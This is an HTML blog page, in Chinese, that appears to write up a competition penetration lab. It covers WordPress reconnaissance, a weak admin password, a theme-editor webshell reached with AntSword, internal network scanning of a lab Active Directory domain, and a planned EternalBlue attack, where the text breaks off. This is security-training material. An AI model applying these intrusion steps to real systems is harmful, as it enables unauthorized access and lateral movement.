@@ -1,0 +1,845 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="首先先用fscan扫一下内容 123456789101112131415161718192021222324D:\ONE-FOX集成工具箱_V8.2公开版_by狐狸\gui_scan\fscan&gt;fscan.exe -h 39.99.229.232┌──────────────────────────────────────────────┐│    ___">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2022半决赛复现">
+<meta property="og:url" content="https://0ran9ewww.github.io/2025/05/01/%E6%B8%97%E9%80%8F/wdb2022/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="首先先用fscan扫一下内容 123456789101112131415161718192021222324D:\ONE-FOX集成工具箱_V8.2公开版_by狐狸\gui_scan\fscan&gt;fscan.exe -h 39.99.229.232┌──────────────────────────────────────────────┐│    ___">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15205705.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15205744.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15210251.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15234105.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-01230833.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-01232035.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-01232729.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02000551.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02000701.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02001122.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02001150.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-05-02001343.png">
+<meta property="article:published_time" content="2025-04-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-01T17:04:16.712Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="代理转发">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0ran9ewww.github.io/images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15205705.png">
+  
+  
+  
+  <title>网鼎杯2022半决赛复现 - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://mhu37d1j.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0raN9e的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="网鼎杯2022半决赛复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-01 00:00" pubdate>
+          2025年5月1日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">网鼎杯2022半决赛复现</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年5月2日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>首先先用fscan扫一下内容</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell">D:\ONE<span class="hljs-literal">-FOX</span>集成工具箱_V8.<span class="hljs-number">2</span>公开版_by狐狸\gui_scan\fscan&gt;fscan.exe <span class="hljs-literal">-h</span> <span class="hljs-number">39.99</span>.<span class="hljs-number">229.232</span><br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /    │</span><br><span class="hljs-string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="hljs-string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="hljs-string">└──────────────────────────────────────────────┘</span><br><span class="hljs-string">      Fscan Version: 2.0.0</span><br><span class="hljs-string"></span><br><span class="hljs-string">[2025-04-15 20:44:35] [INFO] 暴力破解线程数: 1</span><br><span class="hljs-string">[2025-04-15 20:44:35] [INFO] 开始信息扫描</span><br><span class="hljs-string">[2025-04-15 20:44:35] [INFO] 最终有效主机数量: 1</span><br><span class="hljs-string">[2025-04-15 20:44:35] [INFO] 开始主机扫描</span><br><span class="hljs-string">[2025-04-15 20:44:35] [INFO] 有效端口数量: 233</span><br><span class="hljs-string">[2025-04-15 20:44:35] [SUCCESS] 端口开放 39.99.229.232:22</span><br><span class="hljs-string">[2025-04-15 20:44:35] [SUCCESS] 端口开放 39.99.229.232:80</span><br><span class="hljs-string">[2025-04-15 20:44:35] [SUCCESS] 服务识别 39.99.229.232:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="hljs-string">[2025-04-15 20:44:40] [SUCCESS] 服务识别 39.99.229.232:80 =&gt; [http]</span><br><span class="hljs-string">[2025-04-15 20:44:45] [INFO] 存活端口数量: 2</span><br><span class="hljs-string">[2025-04-15 20:44:45] [INFO] 开始漏洞扫描</span><br><span class="hljs-string">[2025-04-15 20:44:45] [INFO] 加载的插件: ssh, webpoc, webtitle</span><br><span class="hljs-string">[2025-04-15 20:44:45] [SUCCESS] 网站标题 http://39.99.229.232      状态码:200 长度:39988  标题:XIAORANG.LAB</span><br><span class="hljs-string">[2025-04-15 20:45:02] [SUCCESS] 扫描已完成: 3/3</span><br></code></pre></td></tr></table></figure>
+<p>没有什么内容，dir扫一下内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[20:45:31] Starting: <br>[20:45:36] 403 -  278B  - /.ht_wsr.txt<br>[20:45:36] 403 -  278B  - /.htaccess.save<br>[20:45:36] 403 -  278B  - /.htaccessBAK<br>[20:45:36] 403 -  278B  - /.htaccess.orig<br>[20:45:36] 403 -  278B  - /.html<br>[20:45:36] 403 -  278B  - /.htaccess_extra<br>[20:45:36] 403 -  278B  - /.htm<br>[20:45:36] 403 -  278B  - /.htaccess.bak1<br>[20:45:36] 403 -  278B  - /.htaccessOLD2<br>[20:45:36] 403 -  278B  - /.htaccessOLD<br>[20:45:36] 403 -  278B  - /.htaccess.sample<br>[20:45:36] 403 -  278B  - /.htaccess_orig<br>[20:45:36] 403 -  278B  - /.htaccess_sc<br>[20:45:36] 403 -  278B  - /.htpasswd_test<br>[20:45:36] 403 -  278B  - /.htpasswds<br>[20:45:36] 403 -  278B  - /.httr-oauth<br>[20:45:37] 403 -  278B  - /.php<br>[20:45:59] 301 -    0B  - /index.php  -&gt;  http://39.99.229.232/<br>[20:46:00] 404 -   35KB - /index.php/login/<br>[20:46:01] 200 -    7KB - /license.txt<br>[20:46:08] 200 -    3KB - /readme.html<br>[20:46:09] 403 -  278B  - /server-status<br>[20:46:09] 403 -  278B  - /server-status/<br>[20:46:18] 301 -  317B  - /wp-admin  -&gt;  http://39.99.229.232/wp-admin/<br>[20:46:18] 200 -  513B  - /wp-admin/install.php<br>[20:46:18] 409 -    3KB - /wp-admin/setup-config.php<br>[20:46:18] 400 -    1B  - /wp-admin/admin-ajax.php<br>[20:46:18] 302 -    0B  - /wp-admin/  -&gt;  http://39.99.229.232/wp-login.php?redirect_to=http%3A%2F%2F39.99.229.232%2Fwp-admin%2F&amp;reauth=1<br>[20:46:18] 200 -    0B  - /wp-config.php<br>[20:46:18] 200 -    0B  - /wp-content/<br>[20:46:18] 301 -  319B  - /wp-content  -&gt;  http://39.99.229.232/wp-content/<br>[20:46:18] 200 -  477B  - /wp-content/uploads/<br>[20:46:18] 200 -  416B  - /wp-content/upgrade/<br>[20:46:18] 200 -   84B  - /wp-content/plugins/akismet/akismet.php<br>[20:46:18] 500 -    0B  - /wp-content/plugins/hello.php<br>[20:46:18] 200 -    0B  - /wp-includes/rss-functions.php<br>[20:46:18] 301 -  320B  - /wp-includes  -&gt;  http://39.99.229.232/wp-includes/<br>[20:46:18] 200 -    2KB - /wp-login.php<br>[20:46:18] 200 -    0B  - /wp-cron.php<br>[20:46:18] 200 -    5KB - /wp-includes/<br>[20:46:18] 302 -    0B  - /wp-signup.php  -&gt;  http://39.99.229.232/wp-login.php?action=register<br>[20:46:18] 405 -   42B  - /xmlrpc.php<br></code></pre></td></tr></table></figure>
+<p>很明显是可以看出是wordpress</p>
+<h2 id="flag1"><a class="markdownIt-Anchor" href="#flag1"></a> flag1</h2>
+<p>先简单的手测了一下是弱密码，fuzz开爆也是可以的</p>
+<p><code>admin::123456</code>登录，然后就是在editor里面写马</p>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15205705.png" srcset="/img/loading.gif" lazyload alt="2025-04-15205705"></p>
+<p>用蚁剑连接木马</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">39.99</span>.<span class="hljs-number">159.217</span><span class="hljs-regexp">//</span>wp-content<span class="hljs-regexp">/themes/</span>twentytwentyone/header.php<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15205744.png" srcset="/img/loading.gif" lazyload alt="2025-04-15205744"></p>
+<p>先上传fsan扫描一下</p>
+<p><img src="/../../images/%E7%BD%91%E9%BC%8E%E6%9D%AF/2022/2025-04-15210251.png" srcset="/img/loading.gif" lazyload alt="2025-04-15210251"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">[2025-04-15 21:02:45] [SUCCESS] 目标 172.22.15.35    存活 (ICMP)<br>[2025-04-15 21:02:45] [SUCCESS] 目标 172.22.15.26    存活 (ICMP)<br>[2025-04-15 21:02:46] [SUCCESS] 目标 172.22.15.13    存活 (ICMP)<br>[2025-04-15 21:02:46] [SUCCESS] 目标 172.22.15.18    存活 (ICMP)<br>[2025-04-15 21:02:46] [SUCCESS] 目标 172.22.15.24    存活 (ICMP)<br>[2025-04-15 21:02:51] [INFO] 存活主机数量: 5<br>[2025-04-15 21:02:51] [INFO] 有效端口数量: 233<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.26:80<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.26:22<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.18:80<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.24:80<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.13:88<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.24:135<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.13:135<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.35:135<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.18:139<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.13:139<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.35:139<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.18:135<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.24:139<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.13:389<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.18:445<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.35:445<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.13:445<br>[2025-04-15 21:02:52] [SUCCESS] 端口开放 172.22.15.24:445<br>[2025-04-15 21:02:52] [SUCCESS] 服务识别 172.22.15.26:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.26:80 =&gt; [http]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.13:88 =&gt; <br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.18:80 =&gt; [http]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.18:139 =&gt;  Banner:[.]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.24:80 =&gt; [http]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.13:139 =&gt;  Banner:[.]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.35:139 =&gt;  Banner:[.]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.24:139 =&gt;  Banner:[.]<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.13:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name<br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.18:445 =&gt; <br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.35:445 =&gt; <br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.13:445 =&gt; <br>[2025-04-15 21:02:57] [SUCCESS] 服务识别 172.22.15.24:445 =&gt; <br>[2025-04-15 21:02:58] [SUCCESS] 端口开放 172.22.15.24:3306<br>[2025-04-15 21:03:02] [SUCCESS] 服务识别 172.22.15.24:3306 =&gt; [mysql] 版本:5.7.26 产品:MySQL Banner:[J.5.7.26.b.H.32...v 2A` 5\@r mysql_native_password]<br>[2025-04-15 21:03:57] [SUCCESS] 服务识别 172.22.15.24:135 =&gt; <br>[2025-04-15 21:03:57] [SUCCESS] 服务识别 172.22.15.13:135 =&gt; <br>[2025-04-15 21:03:57] [SUCCESS] 服务识别 172.22.15.35:135 =&gt; <br>[2025-04-15 21:03:57] [SUCCESS] 服务识别 172.22.15.18:135 =&gt; <br>[2025-04-15 21:03:57] [INFO] 存活端口数量: 19<br>[2025-04-15 21:03:57] [INFO] 开始漏洞扫描<br>[2025-04-15 21:03:57] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle<br>[2025-04-15 21:03:57] [SUCCESS] NetInfo 扫描结果<br>目标主机: 172.22.15.18<br>主机名: XR-CA<br>发现的网络接口:<br>   IPv4地址:<br>      └─ 172.22.15.18<br>[2025-04-15 21:03:57] [SUCCESS] NetInfo 扫描结果<br>目标主机: 172.22.15.13<br>主机名: XR-DC01<br>发现的网络接口:<br>   IPv4地址:<br>      └─ 172.22.15.13<br>[2025-04-15 21:03:57] [SUCCESS] NetInfo 扫描结果<br>目标主机: 172.22.15.24<br>主机名: XR-WIN08<br>发现的网络接口:<br>   IPv4地址:<br>      └─ 172.22.15.24<br>[2025-04-15 21:03:57] [SUCCESS] NetInfo 扫描结果<br>目标主机: 172.22.15.35<br>主机名: XR-0687<br>发现的网络接口:<br>   IPv4地址:<br>      └─ 172.22.15.35<br>[2025-04-15 21:03:57] [INFO] 系统信息 172.22.15.13 [Windows Server 2016 Standard 14393]<br>[2025-04-15 21:03:57] [SUCCESS] 发现漏洞 172.22.15.24 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010<br>[2025-04-15 21:03:57] [SUCCESS] 网站标题 http://172.22.15.24       状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.15.24/www<br>[2025-04-15 21:03:57] [SUCCESS] 网站标题 http://172.22.15.18       状态码:200 长度:703    标题:IIS Windows Server<br>[2025-04-15 21:03:57] [SUCCESS] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393<br>[2025-04-15 21:03:57] [SUCCESS] NetBios 172.22.15.35    XIAORANG\XR-0687              <br>[2025-04-15 21:03:57] [SUCCESS] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1<br>[2025-04-15 21:03:57] [SUCCESS] NetBios 172.22.15.13    DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393<br>[2025-04-15 21:03:57] [SUCCESS] 网站标题 http://172.22.15.26       状态码:200 长度:39962  标题:XIAORANG.LAB<br>[2025-04-15 21:03:58] [SUCCESS] 目标: http://172.22.15.18:80<br>  漏洞类型: poc-yaml-active-directory-certsrv-detect<br>  漏洞名称: <br>  详细信息:<br>	author:AgeloVito<br>	links:https://www.cnblogs.com/EasonJim/p/6859345.html<br>[2025-04-15 21:03:58] [SUCCESS] 网站标题 http://172.22.15.24/www/sys/index.php 状态码:200 长度:135    标题:无标题<br>[2025-04-15 21:04:22] [SUCCESS] 扫描已完成: 35/35<br></code></pre></td></tr></table></figure>
+<p>整理一下信息内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">172.22.15.26 本机已通<br>172.22.15.13 XR-DC01<br>172.22.15.18  XR-CA<br>172.22.15.24 XR-WIN08 MS17-010<br>172.22.15.35 XR-0687<br></code></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[2025-04-15 21:03:57]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 发现漏洞 <span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> <span class="hljs-selector-attr">[Windows Server 2008 R2 Enterprise 7601 Service Pack 1]</span> MS17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>
+<p>需要通个隧道(卡了比较长的时间)，这里用老版的frp直接通吧</p>
+<h2 id="flag2"><a class="markdownIt-Anchor" href="#flag2"></a> flag2</h2>
+<p>打一手永恒之蓝</p>
